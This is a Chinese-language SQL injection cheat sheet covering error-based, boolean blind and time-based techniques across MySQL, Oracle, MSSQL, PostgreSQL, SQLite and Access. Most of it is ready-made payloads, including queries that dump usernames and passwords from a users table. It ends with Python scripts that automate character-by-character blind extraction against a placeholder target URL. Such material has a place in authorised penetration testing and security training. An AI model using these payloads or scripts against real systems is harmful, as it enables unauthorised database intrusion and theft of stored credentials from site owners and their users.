# 2026-07-29 报错注入 / 布尔盲注 / 延时注入 详解

## 一、三大注入类型概览

| 注入类型 | 核心原理 | 适用场景 | 关键特征 |
|----------|---------|---------|---------|
| 报错注入 | 构造异常SQL使数据库报错并回显敏感数据 | 有报错回显 | 速度快，直接出数据 |
| 布尔盲注 | 根据页面返回的 true/false 差异逐字符推断数据 | 无回显但有状态差异 | 速度较慢，需要逐字符猜解 |
| 延时注入 | 根据页面响应时间差异逐字符推断数据 | 无回显且无状态差异 | 最慢，但最通用 |

---

## 二、报错注入（Error-Based Injection）

### 2.1 原理

数据库在执行恶意构造的 SQL 时抛出异常，错误信息中直接携带了想要查询的敏感数据。核心思想：**让数据库的报错信息变成你的回显通道。**

### 2.2 MySQL 报错注入

#### （1）updatexml 报错

```sql
-- 基本用法：将 version() 的信息通过报错输出
AND updatexml(1, concat(0x7e, version()), 1)

-- 查数据库名
AND updatexml(1, concat(0x7e, database()), 1)

-- 查表名（一行一行爆）
AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), 1)

-- 爆字段
AND updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)), 1)

-- 爆数据
AND updatexml(1, concat(0x7e, (SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)), 1)

-- 注意：updatexml 最多显示 32 位，超长需要截取
AND updatexml(1, concat(0x7e, substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 1, 32)), 1)
-- 从第33位继续
AND updatexml(1, concat(0x7e, substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 33, 32)), 1)
```

**格式总结：** `updatexml(1, concat(0x7e, (子查询)), 1)`

#### （2）extractvalue 报错

```sql
-- 基本用法
AND extractvalue(1, concat(0x7e, version()))

-- 查数据库
AND extractvalue(1, concat(0x7e, database()))

-- 查表（注意子查询需要加括号）
AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))

-- 爆数据
AND extractvalue(1, concat(0x7e, (SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))

-- extractvalue 也是最多 32 位，超长用 substring
AND extractvalue(1, concat(0x7e, mid((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), 1, 32)))
```

**格式总结：** `extractvalue(1, concat(0x7e, (子查询)))`

**updatexml vs extractvalue：**
- `updatexml` 需要三个参数，`extractvalue` 只要两个
- 两者都是 32 位显示限制
- 两者都是 XPATH 解析错误导致的报错

#### （3）floor + rand + group by 报错（duplicate entry）

```sql
-- 经典 payload
AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 查数据库
AND (SELECT 1 FROM (SELECT count(*), concat(database(), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 查表名（一行一行来）
AND (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 爆数据
AND (SELECT 1 FROM (SELECT count(*), concat((SELECT concat(username,0x3a,password) FROM users LIMIT 0,1), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)

-- 显示长度约 64 位，比 updatexml/extractvalue 多一倍
```

**原理：** `floor(rand(0)*2)` 配合 `GROUP BY` 产生重复键错误，`concat` 将查询结果拼接进错误信息。

**格式总结：**
```sql
AND (SELECT 1 FROM (SELECT count(*), concat((子查询), 0x7e, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)
```

**注意：** 子查询返回多行会报错 `Subquery returns more than 1 row`，必须用 `LIMIT` 限制。

#### （4）exp 溢出报错（MySQL 5.5.5 之前可用）

```sql
-- 利用 exp 函数整数溢出
AND exp(~(SELECT * FROM (SELECT user()) a))
AND exp(~(SELECT * FROM (SELECT database()) a))
-- 双重否定取反：~0 = 18446744073709551615，exp 会溢出报错
```

#### （5）BIGINT 溢出报错（MySQL 5.5.5+）

```sql
-- 利用 ~0 + 1 的 BIGINT 溢出
AND (SELECT (!(SELECT * FROM (SELECT user()) x)) + ~0)
```

#### （6）NAME_CONST 报错

```sql
-- 重复列名报错
AND (SELECT * FROM (SELECT NAME_CONST(version(), 1), NAME_CONST(version(), 1)) a)
```

#### （7）geometrycollection / polygon / linestring / multipoint 报错

```sql
-- 几何函数类型错误
AND geometrycollection((SELECT * FROM (SELECT user()) a))
AND polygon((SELECT * FROM (SELECT user()) a))
AND linestring((SELECT * FROM (SELECT user()) a))
AND multipoint((SELECT * FROM (SELECT user()) a))
AND multilinestring((SELECT * FROM (SELECT user()) a))
AND multipolygon((SELECT * FROM (SELECT user()) a))
```

---

### 2.3 Oracle 报错注入

```sql
-- (1) utl_inaddr.get_host_name (最常用)
AND (SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual) = 1

-- (2) ctxsys.drithsx.sn
AND (SELECT ctxsys.drithsx.sn(1, (SELECT user FROM dual)) FROM dual) = 1

-- (3) dbms_xdb_version.checkin
AND (SELECT dbms_xdb_version.checkin((SELECT user FROM dual)) FROM dual) = 1

-- (4) dbms_xdb_version.makeversioned
AND (SELECT dbms_xdb_version.makeversioned((SELECT user FROM dual)) FROM dual) = 1

-- (5) dbms_utility.sqlid_to_sqlhash
AND (SELECT dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual)) FROM dual) = 1

-- (6) ordsys.ord_dicom.getmappingxpath
AND (SELECT ordsys.ord_dicom.getmappingxpath((SELECT user FROM dual), 1, 1) FROM dual) = 1
```

---

### 2.4 MSSQL 报错注入

```sql
-- (1) convert 类型转换报错（最常用）
AND 1=convert(int, (SELECT @@version))

-- (2) 除法报错
AND 1/(SELECT @@version)

-- (3) 直接使用常量触发转换报错
AND 1=@@version

-- (4) 嵌套查询
AND 1=convert(int, (SELECT top 1 table_name FROM information_schema.tables))
```

---

### 2.5 PostgreSQL 报错注入

PostgreSQL 报错注入较少，主要依赖布尔盲注和延时注入，但也有个别报错方法：

```sql
-- 利用类型转换
AND (SELECT cast(version() as int))

-- 利用除零
AND 1/(SELECT 0)
```

---

## 三、布尔盲注（Boolean-Based Blind Injection）

### 3.1 原理

页面不返回数据，也不返回错误信息，但**注入成功和失败时页面表现不同**（如内容变化、状态码不同、长度变化）。利用这种差异逐字符推断数据。

**核心循环逻辑：** 猜测的字符是否正确？→ 页面有差异 → 确定该字符 → 下一位。

### 3.2 MySQL 布尔盲注

#### 核心函数

```sql
-- if(条件, 真返回值, 假返回值)
-- substr(string, start, length)  -- 截取字符串
-- ascii(char)                    -- 字符转ASCII
-- length(str)                    -- 字符串长度
```

#### 逐字符猜解流程

```sql
-- 第一步：猜数据库名长度
AND length(database()) = 5   -- 如果页面正常，长度=5
AND length(database()) > 5   -- 如果页面异常，长度<=5
-- 二分法快速定位长度

-- 第二步：逐字符猜数据库名
AND ascii(substr(database(), 1, 1)) = 115  -- 第1位是 's' (ASCII 115)
AND ascii(substr(database(), 2, 1)) = 113  -- 第2位是 'q'
AND ascii(substr(database(), 3, 1)) = 108  -- 第3位是 'l'
-- 最终得到: sql

-- 实际盲注时用大于小于二分法 (效率更高)
AND ascii(substr(database(), 1, 1)) > 100  -- 正常 → 范围 101~122
AND ascii(substr(database(), 1, 1)) > 110  -- 正常 → 范围 111~122
AND ascii(substr(database(), 1, 1)) > 115  -- 异常 → 范围 111~115
AND ascii(substr(database(), 1, 1)) = 115  -- 正常 → 确定 's'
```

#### 完整盲注语句模板

```sql
-- 猜数据库长度
AND length(database()) = N

-- 猜数据库名（逐字符）
AND ascii(substr(database(), N, 1)) = ASC

-- 猜表数量
AND (SELECT count(*) FROM information_schema.tables WHERE table_schema=database()) = N

-- 猜表名长度
AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) = N

-- 猜表名（逐字符）
AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), N, 1)) = ASC

-- 猜字段数量
AND (SELECT count(*) FROM information_schema.columns WHERE table_name='users') = N

-- 猜字段名长度
AND length((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)) = N

-- 猜字段名
AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), N, 1)) = ASC

-- 猜数据长度
AND length((SELECT concat(username, password) FROM users LIMIT 0,1)) = N

-- 猜数据
AND ascii(substr((SELECT concat(username, password) FROM users LIMIT 0,1), N, 1)) = ASC
```

#### 其他条件判断方式

```sql
-- 用 case when
AND (SELECT CASE WHEN ascii(substr(database(),1,1))=115 THEN 1 ELSE 0 END)

-- 用 or / and 短路
AND 1=1   -- 正常
AND 1=2   -- 异常
```

### 3.3 Oracle 布尔盲注

```sql
-- Oracle 用 decode 或 case when
-- decode(expr, search, result, default)

-- 猜用户名长度
AND (SELECT decode(length(user), 5, 1, 0) FROM dual) = 1

-- 猜用户名逐字符
AND (SELECT decode(substr(user, 1, 1), 'S', 1, 0) FROM dual) = 1

-- 逐字符（ASCII）
AND (SELECT decode(ascii(substr(user, 1, 1)), 83, 1, 0) FROM dual) = 1

-- 用 instr 判断
AND (SELECT instr(user, 'S', 1, 1) FROM dual) = 1

-- 查看所有表名
AND (SELECT decode(substr((SELECT table_name FROM all_tables WHERE rownum=1), 1, 1), 'A', 1, 0) FROM dual) = 1
```

### 3.4 MSSQL 布尔盲注

```sql
-- MSSQL 用 CASE WHEN 或 IIF
-- IIF(条件, 真, 假)

-- 猜数据库名长度
AND (SELECT IIF(len(db_name())=5, 1, 0))

-- 猜数据库名逐字符
AND (SELECT IIF(ascii(substring(db_name(), 1, 1))=115, 1, 0))

-- 猜表名
AND (SELECT IIF(ascii(substring((SELECT top 1 name FROM sysobjects WHERE xtype='U'), 1, 1))=97, 1, 0))
```

### 3.5 Access 布尔盲注

```sql
-- Access 用 IIF + asc + mid
-- IIF(条件, 真值, 假值)

-- 判断表是否存在
AND EXISTS (SELECT * FROM admin)

-- 判断列是否存在
AND EXISTS (SELECT username FROM admin)

-- 逐字符猜数据
AND (SELECT IIF(asc(mid(username, 1, 1))>97, 1, 0) FROM admin WHERE id=1)

-- 猜长度
AND (SELECT IIF(len(username)=5, 1, 0) FROM admin WHERE id=1)

-- 配合 TOP 1 逐行猜
AND (SELECT top 1 IIF(asc(mid(username, 1, 1))=97, 1, 0) FROM admin)
```

### 3.6 PostgreSQL 布尔盲注

```sql
-- 猜当前数据库长度
AND (SELECT length(current_database())) = 5

-- 猜数据库逐字符
AND (SELECT ascii(substr(current_database(), 1, 1))) = 115

-- 猜表名
AND (SELECT ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1))) = 97
```

### 3.7 布尔盲注提速技巧

```
1. 二分法（O(logN)）代替线性猜测（O(N)）
   - ASCII 范围 32~126，二分法 7 次确定一个字符
   - 线性猜测最坏 94 次

2. 正则批量匹配（有些环境下可用）
   AND (SELECT username FROM users WHERE id=1) REGEXP '^a'
   AND (SELECT username FROM users WHERE id=1) LIKE 'ad%'

3. 先猜长度，再逐字符
   - 减少无效请求
```

### 3.8 判断布尔差异的方法

```
1. 页面内容不同 (有/无数据)
2. 页面大小不同 (Content-Length)
3. HTTP 状态码不同 (200/500)
4. 响应时间不同（布尔+时间结合）
5. 页面标题不同
6. 有无特定字符串
```

---

## 四、延时注入（Time-Based Blind Injection）

### 4.1 原理

页面没有任何回显差异时使用。通过构造条件判断 + 延时函数，如果条件为真则延时 N 秒，根据响应时间推断判断结果。**最慢但最通用。**

### 4.2 MySQL 延时注入

#### 核心函数

```sql
-- sleep(N)      延时 N 秒
-- if(条件, A, B)  条件判断
-- benchmark(count, expr)  重复执行 expr 造成延时
```

#### 逐字符猜解

```sql
-- 判断数据库名长度
AND if(length(database()) = 5, sleep(3), 0)

-- 逐字符猜数据库名
AND if(ascii(substr(database(), 1, 1)) = 115, sleep(3), 0)

-- 猜表名长度
AND if(length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) = 5, sleep(3), 0)

-- 猜表名逐字符
AND if(ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)) = 117, sleep(3), 0)

-- 猜字段名
AND if(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1)) = 105, sleep(3), 0)

-- 爆数据
AND if(ascii(substr((SELECT concat(username, 0x3a, password) FROM users LIMIT 0,1), 1, 1)) = 97, sleep(3), 0)
```

**延时注入模板：**
```sql
AND if(ascii(substr((子查询), 位置, 1)) = ASCII值, sleep(3), 0)
```

#### benchmark 延时

```sql
-- sleep 被过滤时用 benchmark
AND if(ascii(substr(database(), 1, 1))=115, benchmark(50000000, md5(1)), 0)

-- benchmark 原理：重复执行 md5(1) 5000 万次产生延时
-- 适合 MySQL 无 sleep 权限时使用
```

#### 笛卡尔积延时

```sql
-- sleep 和 benchmark 都被过滤时用
AND if(ascii(substr(database(), 1, 1))=115,
  (SELECT count(*) FROM information_schema.columns A,
   information_schema.columns B,
   information_schema.columns C),
  0)
-- 三个系统表做笛卡尔积，即使 sleep 被禁用也能延时
```

#### 正则延时

```sql
-- 利用正则匹配大量数据产生延时
AND if(ascii(substr(database(), 1, 1))=115,
  (SELECT rpad('a', 9999999, 'a') REGEXP concat(repeat('(a.*)+', 30), 'b')),
  0)
```

#### get_lock 延时注入

```sql
-- 利用 MySQL 锁机制
-- Step 1: 先锁住一个名字
AND get_lock('test', 5)
-- Step 2: 条件注入中使用同一个锁名
AND if(ascii(substr(database(), 1, 1))=115, get_lock('test', 5), 0)
-- 如果锁被占用，第二个 get_lock 等待5秒后返回0
```

---

### 4.3 Oracle 延时注入

```sql
-- dbms_pipe.receive_message 延时
-- dbms_pipe.receive_message('pipe_name', timeout_seconds)

-- 基本格式
AND (SELECT CASE WHEN (条件) THEN dbms_pipe.receive_message(('x'), 3) ELSE 1 END FROM dual) = 1

-- 判断数据库名长度
AND (SELECT CASE WHEN (length(user) = 5) THEN dbms_pipe.receive_message(('x'), 3) ELSE 1 END FROM dual) = 1

-- 逐字符猜解
AND (SELECT CASE WHEN (ascii(substr(user, 1, 1)) = 83) THEN dbms_pipe.receive_message(('x'), 3) ELSE 1 END FROM dual) = 1

-- 简化写法
AND (SELECT decode(substr(user, 1, 1), 'S', dbms_pipe.receive_message(('x'), 3), 1) FROM dual) = 1

-- dbms_lock.sleep (需要权限，不常用)
AND (SELECT dbms_lock.sleep(3) FROM dual) = 1
```

---

### 4.4 MSSQL 延时注入

```sql
-- (1) WAITFOR DELAY (最常用)
-- WAITFOR DELAY '时:分:秒'

IF (条件) WAITFOR DELAY '0:0:3'

-- 注入中：
AND IF(ascii(substring(db_name(), 1, 1))=115) WAITFOR DELAY '0:0:3'

-- 堆叠查询方式
; IF (SELECT ascii(substring(db_name(), 1, 1))) = 115 WAITFOR DELAY '0:0:3' --

-- 完整逐字符猜解
AND (SELECT CASE WHEN ascii(substring(db_name(), 1, 1))=115 THEN '' ELSE '' END + '') = '' WAITFOR DELAY '0:0:3'
-- 或更简洁：
; IF(ascii(substring(db_name(), 1, 1))=115) WAITFOR DELAY '0:0:3' --

-- (2) WAITFOR TIME (指定具体时刻)
; IF ascii(substring(db_name(), 1, 1))=115 WAITFOR TIME '23:59:59' --
```

**MSSQL 延时模板：**
```sql
; IF(ascii(substring((子查询), 位置, 1))=ASCII值) WAITFOR DELAY '0:0:3' --
```

---

### 4.5 PostgreSQL 延时注入

```sql
-- pg_sleep(seconds)
-- 普通延时
AND (SELECT pg_sleep(3))

-- 条件延时
AND (SELECT CASE WHEN (length(current_database())=5) THEN pg_sleep(3) ELSE pg_sleep(0) END)

-- 逐字符猜解
AND (SELECT CASE WHEN (ascii(substr(current_database(), 1, 1))=115) THEN pg_sleep(3) ELSE pg_sleep(0) END)

-- 简化写法
AND (SELECT 1 FROM (SELECT CASE WHEN (条件) THEN pg_sleep(3) ELSE pg_sleep(0) END) a)
```

---

### 4.6 SQLite 延时注入

```sql
-- SQLite 没有原生 sleep 函数

-- 方法1: randomblob 大对象生成延时
AND (SELECT CASE WHEN substr((SELECT name FROM sqlite_master LIMIT 1),1,1)='a' THEN randomblob(100000000) ELSE 0 END)

-- 方法2: 大量 LIKE 运算延时
AND (SELECT CASE WHEN (条件) THEN LIKE('AAAAAAAAAA', UPPER(HEX(RANDOMBLOB(99999999)))) ELSE 0 END)

-- 方法3: 复杂的递归/计算造成延时 (如果支持 CTE)
```

---

### 4.7 Access 延时注入

Access 没有原生延时函数，一般只用布尔盲注。

---

### 4.8 延时时间选择策略

```
1. 延时 3 秒为宜：
   - 太短(1s)：网络波动容易误判
   - 太长(10s+)：注入太慢
   - 3s 是平衡点

2. 配合二分法：
   - ASCII 范围 32~126，二分7次确认一个字符
   - 每次3s，一个字符约21s
   - 10位表名约3.5分钟

3. 重要优化：
   - 先判断长度（减少无效探测）
   - 过滤掉不可打印字符
   - 批量并发探测（工具层面）
```

---

## 五、三种注入方式选择决策

```
                    ┌─────────────────┐
                    │   SQL 注入点？   │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  有报错回显吗？  │
                    └────────┬────────┘
                        是   │   否
                 ┌──────────▼──────────┐
                 │    报错注入 ★推荐   │
                 │  (updatexml/       │
                 │   extractvalue/    │
                 │   floor+rand)      │
                 └────────────────────┘
                             │
                    ┌────────▼────────┐
                    │  有状态差异吗？  │
                    │ (页面/状态码/   │
                    │  内容不同)      │
                    └────────┬────────┘
                        是   │   否
                 ┌──────────▼──────────┐
                 │    布尔盲注         │
                 │  (ascii+substr+if) │
                 └────────────────────┘
                             │
                    ┌────────▼────────┐
                    │    延时盲注      │
                    │  (sleep + if)   │
                    │  最后的手段      │
                    └────────────────────┘
```

**优先级：报错注入 > 布尔盲注 > 延时注入**
- 有报错就报错，最快
- 有差异就布尔，其次
- 什么都没有才延时，最慢但一定能用

---

## 六、盲注自动化脚本思路

### 6.1 布尔盲注 Python 模板

```python
import requests

url = "http://target.com/page.php?id=1"
result = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789_"

for pos in range(1, 30):        # 假设最多30位
    found = False
    for c in chars:
        payload = f" AND ascii(substr(database(),{pos},1))={ord(c)}"
        r = requests.get(url + payload)
        if "正常页面特征" in r.text:   # 根据实际页面判断
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break   # 没有更多字符了

print(f"[Result] {result}")
```

### 6.2 延时盲注 Python 模板

```python
import requests
import time

url = "http://target.com/page.php?id=1"
result = ""

for pos in range(1, 30):
    found = False
    for ascii_val in range(32, 127):  # 可打印ASCII范围
        payload = f" AND if(ascii(substr(database(),{pos},1))={ascii_val}, sleep(3), 0)"
        start = time.time()
        requests.get(url + payload, timeout=10)
        elapsed = time.time() - start

        if elapsed > 2.5:    # 响应超过2.5秒 = 猜对了
            result += chr(ascii_val)
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break

print(f"[Result] {result}")
```

### 6.3 二分法优化

```python
def bisect_char(url, pos):
    """二分法确定第pos位字符的ASCII值"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f" AND ascii(substr(database(),{pos},1))>{mid}"
        r = requests.get(url + payload)
        if "正常页面特征" in r.text:
            low = mid + 1    # 猜小了，上移
        else:
            high = mid       # 猜大了，下移
    return chr(low)

# 二分法 O(logN) ≈ 7次/字符 vs 线性 O(N) ≈ 94次/字符
```

---

> **总结：**
> - **报错注入**：利用 updatexml / extractvalue / floor+rand 让错误信息回显数据，最快最方便
> - **布尔盲注**：利用 if + substr + ascii 逐字符二分猜解，依赖页面状态差异
> - **延时注入**：利用 if + sleep 逐字符猜解，无回显无差异时的终极手段，最慢但最通用
> - 三者选择顺序：报错 > 布尔 > 延时
